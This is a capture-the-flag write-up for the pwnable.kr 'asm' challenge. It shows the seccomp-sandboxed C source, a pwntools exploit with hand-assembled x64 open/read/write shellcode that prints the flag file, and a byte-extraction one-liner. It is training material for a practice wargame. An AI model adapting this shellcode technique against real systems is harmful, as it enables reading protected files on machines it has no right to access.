# Game
```txt
Mommy! I think I know how to make shellcodes

ssh asm@pwnable.kr -p2222 (pw: guest)
```

# Readme
```txt
once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. 
(file name of the flag is same as the one in this directory)
```
# Asm.c
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");
        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}
```

# Flag name
```txt
asm@ubuntu:~$ ls
asm
asm.c
readme
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```

# Exploit
```py
from pwn import *

con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)
context(arch='amd64', os='linux')

'''
# The easy way to do it....
shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
'''

# The hard way to do it...
# ; Push file name onto stack
shellcode = ""
shellcode += "mov rax, 0x101010101010101\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x101010101010101 ^ 0x676e6f306f306f\n"
shellcode += "xor [rsp], rax\n"
shellcode += "mov rax, 0x306f306f306f306f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x3030303030303030\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x303030306f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f3030303030\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x3030303030303030\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x3030303030303030\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x303030306f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6f6f6f6f6f6f6f6f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6c5f797265765f73\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x695f656d616e5f65\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x6c69665f6568745f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x7972726f732e656c\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x69665f736968745f\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x646165725f657361\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x656c705f656c6966\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x5f67616c665f726b\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x2e656c62616e7770\n"
shellcode += "push rax\n"
shellcode += "mov rax, 0x5f73695f73696874\n"
shellcode += "push rax\n"
# ; Open
shellcode += "push 2\n"
shellcode += "pop rax\n"
shellcode += "mov rdi, rsp\n"
shellcode += "xor rsi, rsi\n"
shellcode += "xor rdx, rdx\n"
shellcode += "syscall \n"
# ; Read
shellcode += "mov rdi, rax\n"
shellcode += "xor rax,rax\n"
shellcode += "push 0x64\n"
shellcode += "pop rdx\n"
shellcode += "mov rsi, rsp\n"
shellcode += "syscall \n"
# ; Write
shellcode += "push 1\n"
shellcode += "pop rax\n"
shellcode += "push 1\n"
shellcode += "pop rdi\n"
shellcode += "push 0x64\n"
shellcode += "pop rdx\n"
shellcode += "mov rsi, rsp\n"
shellcode += "syscall" 

#log.info(shellcode)

p.recvuntil('shellcode: ')
p.send(asm(shellcode))
log.success(p.recvline())
```

# Test Shellcode
```sh
; nasm -f elf64 -o shellcode.o shellcode.asm && ld -m elf_x86_64 -o shellcode shellcode.o && objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:| cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed "s| $||g" |sed "s/ /\\\x/g"| paste -d '' -s | sed "s|^|\"|" | sed "s|$|\"|g" > shellcode.txt && cat shellcode.txt
```